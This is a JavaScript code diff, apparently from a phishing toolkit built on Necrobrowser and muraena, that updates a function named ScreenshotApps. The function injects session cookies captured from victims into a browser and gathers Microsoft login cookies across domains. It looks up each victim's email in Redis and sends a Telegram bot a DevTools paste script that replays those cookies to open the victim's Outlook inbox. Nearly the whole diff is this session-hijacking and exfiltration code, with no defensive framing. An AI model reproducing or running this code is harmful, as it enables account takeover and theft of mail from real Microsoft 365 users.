@@ -95,24 +95,17 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
 exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     await db.UpdateTaskStatus(taskId, "running")
 
-    // Inject pre-auth cookies and navigate - MSAL SSO completes silently on no-MFA tenants
-    await page.setCookie(...cookies);
-    await page.goto(params.fixSession);
-    await necrohelp.Sleep(5000)
-
-    // POST-AUTH COOKIE HARVEST
-    // Navigate to OWA to trigger OWA session cookie issuance.
-    console.log(`[${taskId}] navigating to OWA for post-auth cookies...`)
+    // 1. Inject muraena-captured cookies and let MSAL complete silently on fixSession
+    await page.setCookie(...cookies)
     try {
-        await page.goto('https://outlook.office.com/mail/', { waitUntil: 'domcontentloaded', timeout: 30000 })
+        await page.goto(params.fixSession, { waitUntil: 'networkidle2', timeout: 35000 })
     } catch(e) {
-        console.log(`[${taskId}] OWA nav: ${e.message}`)
+        console.log(`[${taskId}] fixSession: ${e.message}`)
     }
-    await necrohelp.Sleep(6000)
+    await necrohelp.Sleep(3000)
 
-    // Collect cookies across ALL Microsoft domains — page.cookies() without
-    // args only returns cookies for the current URL's domain, missing the
-    // login.microsoftonline.com auth tokens the injection script also needs.
+    // 2. Collect combined cookie set from ALL Microsoft domains
+    //    (muraena pre-auth cookies + any tokens MSAL issued during fixSession)
     const MS_DOMAINS = [
         'https://login.microsoftonline.com',
         'https://login.live.com',
@@ -127,82 +120,102 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     try {
         allCookies = await page.cookies(...MS_DOMAINS)
     } catch(e) {
-        console.log(`[${taskId}] multi-domain cookies failed (${e.message}), falling back`)
+        console.log(`[${taskId}] multi-domain cookies failed: ${e.message}`)
         allCookies = await page.cookies()
     }
-    console.log(`[${taskId}] collected ${allCookies.length} post-auth cookies (all MS domains)`)
+    console.log(`[${taskId}] collected ${allCookies.length} cookies (muraena+MSAL combined)`)
 
-    // Look up victim email from Redis using the task's stored name (= victim UUID)
+    // 3. Look up victim email from Redis (task name = victim UUID from %%%TRACKER%%%)
     let victimEmail = null
+    let victimUUID = null
     try {
-        const { createClient } = require('redis')
-        const rc = createClient({ url: process.env.REDIS_URL || 'redis://redis:6379' })
-        await rc.connect()
+        const { createClient: _rc1 } = require('redis')
+        const rc1 = _rc1({ url: process.env.REDIS_URL || 'redis://redis:6379' })
+        await rc1.connect()
         try {
-            // task hash stores name = victim UUID (%%%TRACKER%%% replacement)
-            const victimUUID = await rc.hGet(taskId, 'name')
+            victimUUID = await rc1.hGet(taskId, 'name')
             console.log(`[${taskId}] victimUUID: ${victimUUID}`)
             if (victimUUID) {
-                const credKeys = await rc.keys(`victim:${victimUUID}:creds:*`)
+                const credKeys = await rc1.keys(`victim:${victimUUID}:creds:*`)
                 for (const k of credKeys) {
-                    const cred = await rc.hGetAll(k)
-                    const kl = (cred.Key || '').toLowerCase()
+                    const cred = await rc1.hGetAll(k)
+                    // Redis stores: { key: 'Username', val: 'user@domain.com', time: '...' }
+                    const kl = (cred.key || '').toLowerCase()
                     if (['loginfmt', 'username', 'email', 'login'].includes(kl)) {
-                        victimEmail = cred.Value
+                        victimEmail = cred.val
                         break
                     }
                 }
             }
-        } finally { await rc.quit() }
+        } finally { await rc1.quit() }
     } catch(e) { console.log(`[${taskId}] email lookup: ${e.message}`) }
 
     const label = victimEmail || taskId
     let finalUrl = 'unknown'; try { finalUrl = page.url() } catch(e) {}
-    console.log(`[${taskId}] label: ${label}  finalUrl: ${finalUrl.substring(0,80)}`)
+    console.log(`[${taskId}] label=${label}  finalUrl=${finalUrl.substring(0,80)}`)
 
     if (params.telegramToken && params.telegramChatId) {
-        try {
-            const TelegramBot = require('node-telegram-bot-api')
-            const bot = new TelegramBot(params.telegramToken, { polling: false })
-            const chatIds = Array.isArray(params.telegramChatId) ? params.telegramChatId : [params.telegramChatId]
+        // 4. SETNX dedup — one delivery per victim email address per 24 h
+        let alreadySent = false
+        if (victimEmail) {
+            try {
+                const { createClient: _rc2 } = require('redis')
+                const rc2 = _rc2({ url: process.env.REDIS_URL || 'redis://redis:6379' })
+                await rc2.connect()
+                const nx = await rc2.set(`victim:necro_sent:${victimEmail}`, '1', { NX: true, EX: 86400 })
+                alreadySent = (nx === null)
+                await rc2.quit()
+                if (alreadySent) console.log(`[${taskId}] dedup: already sent for ${victimEmail}`)
+            } catch(e) { console.log(`[${taskId}] dedup err: ${e.message}`) }
+        }
 
-            const cookieArr = allCookies.map(c => ({
-                Name: c.name, Value: c.value, Domain: c.domain,
-                Path: c.path || '/', Secure: c.secure || false,
-                HttpOnly: c.httpOnly || false, SameSite: c.sameSite || 'None'
-            }))
+        if (!alreadySent) {
+            try {
+                const TelegramBot = require('node-telegram-bot-api')
+                const bot = new TelegramBot(params.telegramToken, { polling: false })
+                const chatIds = Array.isArray(params.telegramChatId) ? params.telegramChatId : [params.telegramChatId]
 
-            const escaped = JSON.stringify(cookieArr).replace(/\\/g, '\\\\').replace(/'/g, "\\'")
-            const script = `(function(){const cookies=JSON.parse('${escaped}');const MAX=63072000;const EX=new Date(Date.now()+MAX*1000).toUTCString();const ATTR='expires='+EX+';Max-Age='+MAX;function putCookie(n,v,d,p,s){let c;if(n.indexOf('__Host')===0){c=n+'='+v+';'+ATTR+';path=/;Secure;SameSite=None';}else if(s){c=n+'='+v+';'+ATTR+';domain='+d+';path='+p+';Secure;SameSite=None';}else{c=n+'='+v+';'+ATTR+';domain='+d+';path='+p+';SameSite=Lax';}try{document.cookie=c;}catch(x){}}for(const k of cookies){putCookie(k.Name,k.Value,k.Domain,k.Path,k.Secure);}window.location.href='https://outlook.office.com/mail/';})();`
+                // Build cookie array preserving all fields
+                const cookieArr = allCookies.map(c => ({
+                    Name: c.name, Value: c.value, Domain: c.domain,
+                    Path: c.path || '/', Secure: c.secure || false,
+                    HttpOnly: c.httpOnly || false, SameSite: c.sameSite || 'None',
+                    Expires: c.expires || 0
+                }))
 
-            const caption = `[Kratos]- OFFICE VALID [ ${label} ]❤️`
-            const safeLabel = label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '')
-            const filename = `${safeLabel}.txt`
+                // Base64 encode the JSON — avoids all backslash/quote escaping bugs
+                // that corrupted cookie values with the old JSON.parse('...') approach
+                const b64 = Buffer.from(JSON.stringify(cookieArr)).toString('base64')
 
-            for (const chatId of chatIds) {
-                await bot.sendDocument(chatId, Buffer.from(script), { caption }, { filename, contentType: 'text/plain' })
-                console.log(`[${taskId}] sent ${allCookies.length} cookies to Telegram chat ${chatId}`)
-            }
-        } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
+                // Injection script: paste in DevTools console on login.microsoftonline.com
+                // MSAL will then do a fresh silent auth and open OWA inbox directly
+                const script = [
+                    '// KRATOS OFFICE365 — paste in DevTools console on https://login.microsoftonline.com',
+                    '(function(){',
+                    '  var c=JSON.parse(atob("' + b64 + '"));',
+                    '  var exp=new Date(Date.now()+63072000000).toUTCString();',
+                    '  c.forEach(function(k){',
+                    '    var s=k.Name+"="+k.Value+";domain="+k.Domain+";path="+k.Path+";expires="+exp+";SameSite=None";',
+                    '    if(k.Secure)s+=";Secure";',
+                    '    try{document.cookie=s}catch(e){}',
+                    '  });',
+                    '  setTimeout(function(){window.location.href="https://outlook.office.com/mail/"},500);',
+                    '})();'
+                ].join('\n')
+
+                const caption = `[Kratos]- OFFICE VALID [ ${label} ] ❤️`
+                const safeLabel = label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '')
+                const filename = `${safeLabel}.txt`
+
+                for (const chatId of chatIds) {
+                    await bot.sendDocument(chatId, Buffer.from(script), { caption }, { filename, contentType: 'text/plain' })
+                    console.log(`[${taskId}] sent ${allCookies.length} cookies to Telegram ${chatId} as ${filename}`)
+                }
+            } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
+        }
     }
-    // END POST-AUTH COOKIE HARVEST
 
     await necrohelp.ScreenshotCurrentPage(page, taskId)
-
-    // Legacy UI clicks - fail silently on new m365 UI
-    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
-    await necrohelp.Sleep(2000)
-    await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
-    await necrohelp.Sleep(2000)
-    await necrohelp.ScreenshotCurrentPage(page, taskId)
-    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
-    await necrohelp.Sleep(2000)
-    await page.click('#O365_AppTile_SkypeTeams > .o365cs-base > span').catch(console.error)
-    await necrohelp.Sleep(5000)
-    await page.click('.use-app-lnk').catch(console.error)
-    await necrohelp.Sleep(5000)
-    await necrohelp.ScreenshotCurrentPage(page, taskId)
-
     await db.UpdateTaskStatus(taskId, "completed")
 }
 
